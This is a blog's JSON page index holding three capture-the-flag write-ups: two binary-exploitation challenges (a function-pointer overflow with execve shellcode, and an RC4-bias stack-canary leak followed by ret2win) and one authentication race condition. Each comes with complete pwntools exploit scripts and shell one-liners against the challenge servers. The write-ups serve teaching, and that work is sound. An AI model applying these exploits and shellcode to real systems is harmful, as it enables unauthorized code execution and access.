
[{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/","section":"","summary":"","title":"","type":"page"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/buffer-overflow/","section":"Tags","summary":"","title":"Buffer-Overflow","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/","section":"Ctfs","summary":"","title":"Ctfs","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/function-pointer/","section":"Tags","summary":"","title":"Function-Pointer","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/input-buffering/","section":"Tags","summary":"","title":"Input-Buffering","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/prng/","section":"Tags","summary":"","title":"Prng","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/topics/pwn/","section":"Topics","summary":"Binary exploitation and memory corruption challenges.","title":"Pwn","type":"topics"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/race-condition/","section":"Tags","summary":"","title":"Race-Condition","type":"tags"},{"content":"Take a look at this super l33t login system I made for my Computer Architecture class! Heh\u0026hellip;my prof is gonna be so proud. He\u0026rsquo;s 100% gonna boost my GPA.\nSurely this will be safe to push to prod. I\u0026rsquo;ll even do it for him!\nnc challs.ctf.rusec.club 4622 The challenge provides a university login system with role-based access control. Users authenticate via randomly generated RUIDs (Rutgers University IDs), and different roles grant different privileges.\nBinary protections # Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX unknown - GNU_STACK missing PIE: PIE enabled Stack: Executable RWX: Has RWX segments The binary has most standard protections enabled, but critically, the stack is executable. This immediately suggests a shellcode-based exploitation path.\nReverse engineering # User structure and initialization # The binary defines a user structure that stores names, RUIDs, and function pointers:\nstruct user { char name[32]; uint64_t fn; // function pointer uint64_t ruid; // random user ID }; During initialization, two privileged users are created:\nint64_t setup_users() { char const* names[2]; names[0] = \u0026amp;titles.prof; names[1] = \u0026amp;titles.dean; int64_t (* handlers[2])(); handlers[0] = prof; handlers[1] = dean; for (int32_t i = 0; i \u0026lt;= 1; i += 1) { strcpy(\u0026amp;users[i], (\u0026amp;names)[i], \u0026amp;users); users[i].ruid = rand(); // predictable PRNG users[i].fn = handlers[i]; } } The RUIDs are generated using rand() without seeding, making them completely predictable across runs.\nAuthentication flow # The main loop prompts for a RUID and calls the corresponding user\u0026rsquo;s function pointer if a match is found:\nprintf(\u0026#34;Please enter your RUID: \u0026#34;); uint64_t ruid; scanf(\u0026#34;%lu%*c\u0026#34;, \u0026amp;ruid); for (int32_t i = 0; i \u0026lt;= 1; i += 1) { if (users[i].ruid == ruid) { printf(\u0026#34;Welcome, %s!\\n\u0026#34;, \u0026amp;users[i]); users[i].fn(); // call function pointer match = 1; } } This design allows us to trigger arbitrary function pointers by authenticating as different users.\nVulnerability: dean() overflow # The dean() function allows modifying staff member names but contains a critical buffer overflow:\nint64_t dean() { puts(\u0026#34;Change a staff member\u0026#39;s name!\u0026#34;); list_ruids(); int32_t user_idx; if (get_number(\u0026amp;user_idx, 2)) { printf(\u0026#34;New name: \u0026#34;); read(0, \u0026amp;users[user_idx], 0x29); // writes 41 bytes into 32-byte name } } The read() call accepts 41 bytes into a 32-byte buffer, allowing us to overflow into the function pointer (8 bytes) and partially into the RUID (1 byte).\nShellcode injection point # Early in main(), the program reads a NetID into a stack buffer:\nchar net_id[0x40]; read(0, \u0026amp;net_id, 0x40); Since the stack is executable, this becomes our shellcode injection point.\nExploitation strategy # The attack proceeds in four stages:\nPredict RUIDs - Calculate the deterministic rand() values Inject shellcode - Place shellcode on the stack via the NetID prompt Leak PIE base - Overflow to leak a code pointer Leak stack address - Redirect execution to leak a stack pointer Hijack control flow - Point function pointer to shellcode Predicting RUIDs # Since rand() is unseeded, we can predict the values locally:\nfrom ctypes import CDLL libc = CDLL(\u0026#34;libc.so.6\u0026#34;) prof_ruid = libc.rand() # first rand() -\u0026gt; Professor dean_ruid = libc.rand() # second rand() -\u0026gt; Dean These values remain constant across all executions of the binary.\nStage 1: Shellcode injection # We inject execve shellcode at the NetID prompt:\nshellcode = asm( \u0026#34;\u0026#34;\u0026#34; xor esi, esi xor edx, edx xor eax, eax push rax mov rdi, 0x68732f2f6e69622f push rdi mov rdi, rsp mov al, 59 syscall \u0026#34;\u0026#34;\u0026#34; ) p.sendlineafter(b\u0026#34;Please enter your netID:\u0026#34;, shellcode) This shellcode executes /bin/sh and will be our final target.\nStage 2: PIE leak # We authenticate as the Dean and overflow the Professor\u0026rsquo;s name field:\np.sendlineafter(b\u0026#34;Please enter your RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32) By writing exactly 32 bytes, we force the function pointer to be printed alongside the name, leaking a code address.\np.recvuntil(b\u0026#34;[0] {RUID REDACTED} \u0026#34;) leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False)[32:].ljust(8, b\u0026#34;\\0\u0026#34;))[0] bin.address = leak - 0x12f3 Stage 3: Stack leak # We overwrite the Professor\u0026rsquo;s function pointer with puts@plt:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(bin.plt[\u0026#34;puts\u0026#34;])) When we authenticate as the Professor, instead of calling the intended handler, puts() is invoked with the user structure\u0026rsquo;s address, leaking a stack pointer:\np.sendlineafter(b\u0026#34;your RUID:\u0026#34;, str(prof_ruid).encode()) p.recvuntil(b\u0026#34;Welcome\u0026#34;) p.recvline() stack_leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False).ljust(8, b\u0026#34;\\0\u0026#34;))[0] shell_addr = stack_leak + 0x1c0 # calculate shellcode location Stage 4: Shellcode execution # Finally, we overwrite the Professor\u0026rsquo;s function pointer to point to our shellcode:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(shell_addr)) Authenticating as the Professor now triggers our shellcode:\np.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(prof_ruid).encode()) p.interactive() Final exploit # from ctypes import CDLL from pwn import * context.binary = bin = ELF(\u0026#34;./ruid_login\u0026#34;, checksec=False) libc = CDLL(\u0026#34;libc.so.6\u0026#34;) prof_ruid = libc.rand() dean_ruid = libc.rand() shellcode = asm( \u0026#34;\u0026#34;\u0026#34; xor esi, esi xor edx, edx xor eax, eax push rax mov rdi, 0x68732f2f6e69622f push rdi mov rdi, rsp mov al, 59 syscall \u0026#34;\u0026#34;\u0026#34; ) p = remote(\u0026#34;challs.ctf.rusec.club\u0026#34;, 4622) # Stage 1: Inject shellcode p.sendlineafter(b\u0026#34;Please enter your netID:\u0026#34;, shellcode) # Stage 2: Leak PIE base p.sendlineafter(b\u0026#34;Please enter your RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32) p.recvuntil(b\u0026#34;[0] {RUID REDACTED} \u0026#34;) leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False)[32:].ljust(8, b\u0026#34;\\0\u0026#34;))[0] bin.address = leak - 0x12f3 # Stage 3: Leak stack address p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(bin.plt[\u0026#34;puts\u0026#34;])) p.sendlineafter(b\u0026#34;your RUID:\u0026#34;, str(prof_ruid).encode()) p.recvuntil(b\u0026#34;Welcome\u0026#34;) p.recvline() stack_leak = struct.unpack(\u0026#34;\u0026lt;Q\u0026#34;, p.recvline(keepends=False).ljust(8, b\u0026#34;\\0\u0026#34;))[0] shell_addr = stack_leak + 0x1c0 # Stage 4: Execute shellcode p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(dean_ruid).encode()) p.sendlineafter(b\u0026#34;Num:\u0026#34;, b\u0026#34;0\u0026#34;) p.sendafter(b\u0026#34;New name:\u0026#34;, b\u0026#34;A\u0026#34; * 32 + p64(shell_addr)) p.sendlineafter(b\u0026#34;RUID:\u0026#34;, str(prof_ruid).encode()) p.interactive() Flag # RUSEC{w0w_th4ts_such_a_l0ng_net1D_w4it_w4it_wh4ts_g0ing_0n_uh_0h} ","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-25/ruid_login/","section":"Ctfs","summary":"Exploiting predictable RUIDs, buffer overflow, and executable stack for shellcode execution.","title":"Ruid_login","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-25/","section":"Ctfs","summary":"","title":"Scarlet CTF 2025","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/shellcode/","section":"Tags","summary":"","title":"Shellcode","type":"tags"},{"content":"Its 2026, I need to start journal-maxing. Thats why I use speedjournal, which lets me brain-max my thoughts while time-maxing with the speed of C! Its also security-maxed so only I can read my private entries!\nnc challs.ctf.rusec.club 22169 This challenge presents a simple logging system where the flag is stored in a restricted log entry. Only authenticated admin users should be able to read restricted logs, but a timing vulnerability allows us to bypass this check.\nOverview # The program is a multi-threaded journal application with the following features:\nAdmin authentication with a password Writing new log entries (restricted or public) Reading log entries (with access control for restricted entries) A flag stored in a restricted log at index 0 1. Login admin 2. Write log 3. Read log 4. Exit Vulnerability analysis # The authentication mechanism # When you log in as admin, the system sets a global flag but immediately starts a background thread that resets it after a short delay:\nint is_admin = 0; // global authentication flag void *logout_thread(void *arg) { usleep(WAIT_TIME); // sleep for 1000 microseconds (1ms) is_admin = 0; // automatically log out return NULL; } void login_admin() { char pw[32]; printf(\u0026#34;Admin password: \u0026#34;); fgets(pw, sizeof(pw), stdin); if (strncmp(pw, \u0026#34;supersecret\\n\u0026#34;, 12) == 0) { is_admin = 1; // set admin flag pthread_t t; pthread_create(\u0026amp;t, NULL, logout_thread, NULL); pthread_detach(t); puts(\u0026#34;[+] Admin logged in (temporarily)\u0026#34;); } } The logout happens after only 1000 microseconds (1 millisecond). This seems like it would be too fast to exploit, but there\u0026rsquo;s a critical detail that makes this vulnerable.\nThe access control check # Reading a restricted log requires admin privileges:\nvoid read_log() { int idx; printf(\u0026#34;Index: \u0026#34;); scanf(\u0026#34;%d\u0026#34;, \u0026amp;idx); getchar(); if (idx \u0026lt; 0 || idx \u0026gt;= log_count) { puts(\u0026#34;Invalid index\u0026#34;); return; } if (logs[idx].restricted \u0026amp;\u0026amp; !is_admin) { // race condition here puts(\u0026#34;Access denied\u0026#34;); return; } printf(\u0026#34;Log: %s\\n\u0026#34;, logs[idx].content); } The vulnerability is a race condition between the main thread and the logout thread. While is_admin is set to 1, we have a narrow window to read the restricted log before the background thread resets it to 0.\nInput buffering: the key to exploitation # The critical insight is that scanf() and fgets() read from a buffered input stream. When you send multiple lines at once, they\u0026rsquo;re stored in the input buffer and processed sequentially without delay.\nThis means we can send our entire command sequence instantly:\n1 # Select \u0026#34;Login admin\u0026#34; supersecret # Enter password 3 # Select \u0026#34;Read log\u0026#34; 0 # Read index 0 (the flag) When these commands are all sent together, here\u0026rsquo;s what happens:\nThe program reads 1 from the buffer → calls login_admin() login_admin() reads supersecret\\n from the buffer → sets is_admin = 1 The logout thread is created but hasn\u0026rsquo;t executed yet Control returns to main, which reads 3 from the buffer → calls read_log() read_log() reads 0 from the buffer and checks is_admin → still 1! The flag is printed (Later) The logout thread finally executes Because all the input is pre-buffered, the entire sequence executes much faster than 1 millisecond. The program never has to wait for user input, so it completes before the logout thread can fire.\nExploitation # Method 1: Using pwntools # from pwn import * p = remote(\u0026#34;challs.ctf.rusec.club\u0026#34;, 22169) p.sendafter(b\u0026#34;\u0026gt; \u0026#34;, b\u0026#34;1\\nsupersecret\\n3\\n0\\n\u0026#34;) p.interactive() The sendafter() call waits for the prompt, then sends all four commands at once. They\u0026rsquo;re processed from the buffer faster than the thread can reset is_admin.\nMethod 2: Using netcat and printf # printf \u0026#34;1\\nsupersecret\\n3\\n0\\n\u0026#34; | nc challs.ctf.rusec.club 22169 This pipes all the input at once, achieving the same buffering effect.\nExecution trace # 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Admin password: [+] Admin logged in (temporarily) 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Index: Log: RUSEC{wow_i_did_a_data_race} 1. Login admin 2. Write log 3. Read log 4. Exit \u0026gt; Notice how all the prompts appear sequentially with no delay. The entire sequence completes before the 1ms timer expires.\nWhy this works # The exploit succeeds because of three factors:\nInput buffering: Commands are read from a buffer, not interactively Fast execution: Reading from a buffer is much faster than 1ms Threading timing: The logout thread doesn\u0026rsquo;t preempt the main thread immediately Even though 1 millisecond seems very short, it\u0026rsquo;s an eternity in CPU time. A modern processor can execute millions of instructions in 1ms. Our buffered input is processed in microseconds.\nFlag # RUSEC{wow_i_did_a_data_race} ","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/ctfs/scarlet-25/speedjournal/","section":"Ctfs","summary":"Exploiting a TOCTOU race condition to bypass authentication checks.","title":"speedjournal","type":"ctfs"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/tags/threading/","section":"Tags","summary":"","title":"Threading","type":"tags"},{"content":"","date":"10 January 2026","externalUrl":null,"permalink":"/writeups/topics/","section":"Topics","summary":"Browse writeups by category.","title":"Topics","type":"topics"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/bias/","section":"Tags","summary":"","title":"Bias","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/topics/crypto/","section":"Topics","summary":"Cryptography challenges, attacks, and implementations.","title":"Crypto","type":"topics"},{"content":" Grab your resident cryptographer and try our shiny new Encryption-As-A-Service!\nncat --ssl encryptor-pwn.ept.gg 1337 The challenge provides a single ELF binary, encryptor, which exposes a menu-driven encryption service. On startup, it helpfully leaks the address of a forbidden function.\nWelcome to the EPT encryptor! Please behave yourself, and remember to stay away from a certain function at 0x55da2f7324f0! 1. Encrypt a message 2. Reset the key and encrypt again 3. Change offset 4. Exit \u0026gt; Despite PIE being enabled, the address of win() is printed on startup, removing the need for a separate code pointer leak.\nBinary protections # All standard mitigations are enabled.\nArch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled Reverse engineering # Encryption logic # Menu option 1 allows the user to encrypt an arbitrary string.\nif (menu_choice == 1) { printf(\u0026#34;Enter string to encrypt\\n\u0026gt; \u0026#34;); fgets(local_108, 242, stdin); RC4(key, local_108 + local_18, local_1f8, local_108 + local_18); puts_hex(local_1f8); resetKey(); } Two issues immediately stand out:\nfgets() reads 242 bytes into a 240-byte buffer The RC4 input pointer is offset by a stack variable local_18 Relevant stack layout:\nuchar local_1f8[240]; // ciphertext char local_108[240]; // user input Because fgets() writes a trailing null byte, this results in a 1-byte overflow past local_108, corrupting the least significant byte of local_18.\nDisabled offset control # There is a menu option intended to change this offset:\n\u0026gt; 3 Sorry, offset function disabled due to abuse! However, since local_18 is stored directly after the input buffer, the off-by-one overwrite allows us to modify it anyway. This gives indirect control over where RC4 reads plaintext from on the stack.\nStack layout and target # The relevant portion of the stack frame looks like this:\n[ user input buffer ] 240 bytes [ offset variable ] 1 byte (LSB controllable) [ padding ] [ stack canary ] 8 bytes [ saved rbp ] 8 bytes [ return address ] 8 bytes By adjusting the RC4 input offset, we can cause RC4 to encrypt arbitrary stack bytes, including the stack canary.\nRC4 keystream bias # RC4 is a stream cipher that generates a keystream K and encrypts via XOR:\n$$ C = P \\oplus K $$\nRC4 is known to exhibit statistical biases in its early output bytes. In particular, the second keystream byte is biased toward zero with probability:\n$$ \\Pr[K_2 = 0] = \\frac{1}{128} $$\ninstead of the uniform 1/256.\nThis enables a distinguishing attack: if the plaintext byte is constant across encryptions with fresh keys, the most frequent ciphertext byte converges to the plaintext value.\nCanary leakage via bias # We exploit this by:\nForcing RC4 to encrypt a chosen stack byte Aligning that byte with keystream index 2 Repeating encryption with fresh random keys Taking the most frequent ciphertext byte On amd64, the first byte of the stack canary is always 0x00, so only the remaining 7 bytes need to be recovered.\nCanary recovery script # Below is the core logic used to recover the canary one byte at a time.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} # craft input so the RC4 plaintext pointer lands on canary[i] payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) log.success(f\u0026#34;canary = {canary.hex()}\u0026#34;) Notes:\nOnly the least significant byte of the offset is controlled Keystream index 2 is targeted because its bias is strongest The threshold is heuristic and may need tuning on remote Example output:\ncanary = 6f28c7b1a4923e00 ret2win # The binary contains a hidden menu option:\nif (menu_choice == 1337) { printf(\u0026#34;Leaving already? Enter feedback:\\n\u0026gt; \u0026#34;); fgets(local_108, 288, stdin); } This reads 288 bytes into a 240-byte buffer, allowing full control of the return address.\nWith the stack canary known and win() already leaked, exploitation is trivial.\nFinal payload # p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) p.interactive() Successful execution:\nEPT{test_flag} Final solve script # Below is the consolidated exploit used locally and remotely.\nfrom pwn import * elf = ELF(\u0026#34;encryptor\u0026#34;) p = process(elf.path) p.recvline() win_addr = int(p.recvline().split(b\u0026#34;at \u0026#34;)[1][2:-1], 16) canary = [0x00] for i in range(1, 8): counts = {j: 0 for j in range(256)} payload = (b\u0026#34;\\x00\u0026#34; * 240 + p8(0xf7 + i))[:241] p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1\u0026#34;) p.sendafter(b\u0026#34;\u0026gt;\u0026#34;, payload) while True: p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;2\u0026#34;) ct = bytes.fromhex( p.recvline().split(b\u0026#34;Encrypted: \u0026#34;)[1].decode() ) counts[ct[1]] += 1 best = max(counts, key=counts.get) second = sorted(counts.values())[-2] if counts[best] - second \u0026gt; 5: canary.append(best) break canary = bytes(canary) p.sendlineafter(b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;1337\u0026#34;) p.sendlineafter( b\u0026#34;\u0026gt;\u0026#34;, b\u0026#34;A\u0026#34; * 0xf8 + canary + b\u0026#34;B\u0026#34; * 8 + p64(win_addr) ) print(p.recvall().decode()) Takeaways # RC4 remains exploitable even outside traditional network protocols Single-byte overwrites are often sufficient to defeat stack canaries Cryptographic bias can be weaponized as an information leak Disabling functionality does not remove its security impact This challenge is a good example of cryptographic weaknesses amplifying memory corruption rather than replacing it.\n","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/ctfs/ept-25/encryptor/","section":"Ctfs","summary":"Leaking a stack canary using RC4 keystream bias, then ret2win.","title":"Encryptor","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/ctfs/ept-25/","section":"Ctfs","summary":"","title":"Equinor CTF 2025","type":"ctfs"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/rc4/","section":"Tags","summary":"","title":"Rc4","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/stack-canary/","section":"Tags","summary":"","title":"Stack-Canary","type":"tags"},{"content":"","date":"8 November 2025","externalUrl":null,"permalink":"/writeups/tags/stream-cipher/","section":"Tags","summary":"","title":"Stream-Cipher","type":"tags"},{"content":"Hey, I\u0026rsquo;m Frederik. I publish CTF writeups and technical notes here.\nFocus\nBinary exploitation, crypto, reverse engineering, and web security CTFs, security research, and writeups worth sharing ","externalUrl":null,"permalink":"/writeups/about/","section":"About","summary":"Who I am, where to find me, and what I enjoy breaking.","title":"About","type":"about"},{"content":"","externalUrl":null,"permalink":"/writeups/topics/ctfs/","section":"Topics","summary":"Writeups grouped by competition.","title":"CTFs","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeups/topics/rev/","section":"Topics","summary":"Reverse engineering challenges and program analysis.","title":"Rev","type":"topics"},{"content":"","externalUrl":null,"permalink":"/writeups/tags/toctou/","section":"Tags","summary":"","title":"Toctou","type":"tags"},{"content":"","externalUrl":null,"permalink":"/writeups/topics/web/","section":"Topics","summary":"Web exploitation, logic bugs, and application vulnerabilities.","title":"Web","type":"topics"}]